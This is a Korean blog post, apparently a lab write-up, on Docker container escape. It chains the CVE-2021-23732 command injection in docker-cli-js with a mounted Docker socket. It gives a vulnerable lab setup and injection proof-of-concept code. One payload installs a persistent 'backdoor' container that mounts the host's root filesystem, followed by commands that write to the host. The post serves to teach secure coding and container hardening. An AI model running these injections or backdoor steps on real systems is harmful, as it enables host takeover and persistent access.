---
title: "Docker Escape"
date: 2026-02-06 21:00:00 +0900
categories: [PipeLine]
subcategory: Docker
---

![](/assets/img/posts/DockerEscape.png)

## 주제 선정 이유

백엔드와 인프라를 함께 다루다 보면 `Docker`와 같은 컨테이너 기술을 자연스럽게 사용하게 되며, 컨테이너는 격리된 환경에서 동작하기 때문에 비교적 안전하다는 인식을 가지기 쉽습니다. 또한 개발과 배포의 편의성을 위해 다양한 권한을 부여하거나 설정을 추가하는 과정에서 보안적인 부분은 상대적으로 후순위로 밀리는 경우도 많습니다.

처음에는 단순히 컨테이너는 격리되어 있으니 안전하다는 정도로 이해하고 넘어가기도 하지만, 문득 이 격리 구조가 
실제로 얼마나 안전한 것인지, 그리고 어떤 조건에서 깨질 수 있는 것일까라는 궁금증이 생기게 되며, 실제로 
`Docker Socket` 마운트와 같은 설정이나 라이브러리의 취약점이 시스템 전체를 위협하는 통로가 될 수 있다는 점을 
알게 됩니다.

그래서 이번 글에서는 <span style="background-color:#6DB33F">**Docker Escape가 발생하는 원리와 실제 취약점(CVE-2021-23732)을 활용한 공격 흐름**</span>을 
살펴보고, 이를 통해 컨테이너 내부에서 어떻게 호스트 시스템까지 접근이 가능한지와 함께 안전한 컨테이너 설정과 
Secure Coding의 중요성에 대해 정리해보고자 합니다.

## Docker가 뭘까?

![](/assets/img/posts/docker.png)

`Docker`는 <span style="background-color:#6DB33F">**애플리케이션을 신속하게 구축, 테스트 및 배포할 수 있는 소프트웨어 플랫폼이고 소프트웨어를 <br>Container라는 표준화된 유닛으로 패키징**</span>하는데, 이 컨테이너에는 라이브러리, 시스템 도구, 코드 등 소프트웨어를 
실행하는 데 필요한 모든 것이 포함되어 있습니다.

### 컨테이너와 격리

도커의 핵심은 격리인데 마치 화물선에 실린 컨테이너들이 서로의 내용물에 영향을 주지 않고 독립적으로 존재하는 
것처럼, 도커 컨테이너도 하나의 운영체제 위에서 돌아가지만 서로 완벽하게 분리된 공간을 가집니다.
- 파일 시스템 격리
  - 컨테이너 A에서 파일을 지워도 컨테이너 B나 호스트 컴퓨터에는 영향을 주지 않습니다.
- 프로세스 격리
  - 컨테이너 안에서는 자신만의 프로세스만 보일 뿐, 밖에서 무슨 일이 일어나는지 알 수 없습니다.

### 도커 탈출

컨테이너는 격리된 환경에서 실행되는 것이 원칙이지만, 도커 탈출은 이러한 <span style="background-color:#6DB33F">**격리 계층을 우회하여 호스트 운영체제의 자원에 직접 접근하거나 제어권을 획득하는 공격 기법**</span>을 말합니다.

쉽게 비유하자면, 감옥안에 갇힌 죄수가 열쇠를 복제하거나 벽을 부수고 나와서 교도소를 장악하는 상황과 같습니다.

#### CVE-2021-23732

`Node.js` 환경에서 도커를 제어하기 위해 사용하는 라이브러리 `docker-cli-js`에서 발견된 명령어 주입 취약점입니다.
- 원인
  - 사용자로부터 받은 입력값을 검증하지 않고 그대로 쉘 명령어에 합쳐서 실행합니다.
- 결과
  - 공격자는 `&`나`;`같은 특수문자를 이용해 원래 실행되어야 할 명령어 뒤에 자신이 원하는 악의적인 명령어를 
  덧붙여 실행할 수 있습니다.

#### Docker Socket (`/var/run/docker.sock`)

단순히 라이브러리 취약점만으로는 컨테이너 내부에서 파일을 만드는 정도에 그칠 수 있는데 만약 이 취약점이 
도커 소켓 마운트 설정과 만나면 문제가 됩니다.
- 도커소켓
  - 도커 데몬과 통신할 수 있는 일종의 직통 전화선입니다.
- 위험성
  - 컨테이너에 `/var/run/docker.sock`을 마운트 해주는 것은, <span style="background-color:#6DB33F">**컨테이너에게 호스트의 도커를 마음대로 조종할 수 있는 관리자 권한을 쥐어주는 것**</span>과 같습니다.

## 그래서 어떻게 쓰라고?

![](/assets/img/posts/Zzangguhuk.gif)

이제 직접 내 컴퓨터에 안전한 가상환경을 구축하고, 실제 공격 코드를 실행하여 탈출하는 과정을 단계별로 
살펴보겠습니다.

### 시뮬레이션 환경 구축

가장 먼저, 취약점이 존재하는 라이브러리인 `docker-cli-js: 2.10.0`이 포함된 컨테이너 환경을 구성해야 합니다.

이를 위해 `Dockerfile`을 작성하여 최신 `Node.js` 환경을 기반으로 컨테이너를 생성하고, 도커 클라이언트와 함께 
해당 취약한 라이브러리를 설치하도록 설정합니다.

```dockerfile
FROM node:20
WORKDIR /app

# Docker 클라이언트 설치
RUN apt-get update && apt-get install -y docker.io

# 취약한 라이브러리 설정
COPY package.json .
RUN npm install

# 초기 공격 코드 복사
COPY exploit.js .
CMD ["/bin/bash"]
```
`package.json`에는 취약점이 존재하는 `2.10.0` 버전을 명시합니다.
```json
{
  "name": "cve-simulation",
  "version": "1.0.0",
  "dependencies": {
    "docker-cli-js": "2.10.0"
  }
}
```

### 단순 명령어 주입

본격적인 탈출에 앞서, 라이브러리의 취약점이 실제로 동작하는지 확인하기 위해 컨테이너 내부에서 단순히 파일을 
생성해서 하는 공격을 해보겠습니다.

```javascript
var dockerCLI = require('docker-cli-js');
var Docker = dockerCLI.Docker;
var docker = new Docker();

// 주입할 명령어: "touch aaaaaa" (파일 생성)
// &qout;는 특수문자 처리를 우회하기 위한 수단입니다.
var user_input = "&qout;touch aaaaaa&qout;"; 

console.log("명령어 주입 시도");
docker.command('run -td --name '+user_input+' cve').catch(function(err) {
    // 에러가 발생해도 주입된 명령어는 실행됨
    console.log("실행 완료");
});
```

![](/assets/img/posts/DockerAttack.png)

이미지를 빌드하고 실행한 뒤 `node exploit.js`를 입력하면, 에러 로그와 함께 `aaaaaa`라는 파일이 생성된 것을 볼 수 있습니다.

### 도커 소켓을 통한 탈출 및 백도어 설치

앞선 테스트가 단순한 파일 생성이었다면, 이번에는 호스트 시스템의 도커 데몬을 장악하여 새로운 컨테이너를 몰래 
실행시키는 공격을 시도하고 이를 위해 컨테이너 실행 시 `Docker Socket`을 마운트했습니다.

#### 소켓 마운트

호스트의 `/var/run/docker.sock`을 컨테이너 내부에 연결하여 실행하는데 이는 도커를 제어할 수 있는 관리자 권한을 쥐어주는 것과 같습니다.

```bash
docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock cve-sim
```

#### 코드 수정

이제 호스트 시스템에 `backdoor`라는 이름의 악성 컨테이너를 실행시키는 코드를 주입하는데 이번 공격의 핵심은 
`-v /:/host` 옵션인데 이는 호스트의 모든 파일을 컨테이너 내부의 `/host` 디렉토리와 연결하여, 격리벽을 완전히 
허물어버리는 역할을 합니다.

```javascript
var dockerCLI = require('docker-cli-js');
var Docker = dockerCLI.Docker;
var docker = new Docker();

// 호스트의 루트 파일 시스템(/) 전체를 컨테이너에 마운트
// --restart=always : 호스트가 재부팅되어도 백도어가 자동 실행되도록 설정
var user_input = "&qout;docker run -d --name backdoor -v /:/host --restart=always alpine sleep 100000&qout;"; 

console.log("호스트 파일 시스템 탈취를 위한 백도어 설치 중...");

// 취약한 함수를 통해 악성 컨테이너 실행 명령 주입
docker.command('run -td --name '+user_input+' cve').catch(function(err) {
    console.log("백도어 설치 완료. 침투 준비 끝.");
});
```

#### 공격 실행 및 호스트 장악 검증

공격 스크립트를 실행해서 백도어를 설치한 뒤, 설치된 `backdoor` 컨테이너를 통해 호스트의 `/tmp` 디렉토리에 파일을 생성해 보았습니다.

```bash
node exploit.js

# 백도어를 통해 호스트 파일 시스템에 파일 생성
docker exec backdoor sh -c "echo 'YOU_ARE_HACKED' > /host/tmp/hacked.txt"

# 파일 생성 확인
docker exec backdoor sh -c "ls -l /host/tmp/hacked.txt"
```

![](/assets/img/posts/DockerAttack2.png)

## 마무리 

`CVE` 취약점과 `Docker Escape`을 직접 시뮬레이션해보며 제가 느낀 핵심을 다시 정리해보면 다음과 같습니다.

1. 단 하나의 라이브러리 취약점과 편의를 위해 허용한 `Docker Socket` 마운트 설정이 결합되는 순간, 컨테이너 
단위의 문제가 아니라 호스트 시스템 전체를 위협하는 치명적인 공격 벡터로 확장될 수 있음을 직접 확인했습니다.
2. 개발 단계에서의 입력값 검증 부재는 단순한 보안 취약점에 그치지 않고, 인프라 레벨의 권한 탈취와 시스템 
장악으로 이어질 수 있다는 점을 체감했습니다.
3. 단순히 기능이 동작하는 코드보다, 어떤 권한으로 실행되고 어떤 경로로 시스템 자원에 접근하는지까지 고려하는 시각이 백엔드 개발자에게 필수적인 기본기라는 것을 깨달았습니다.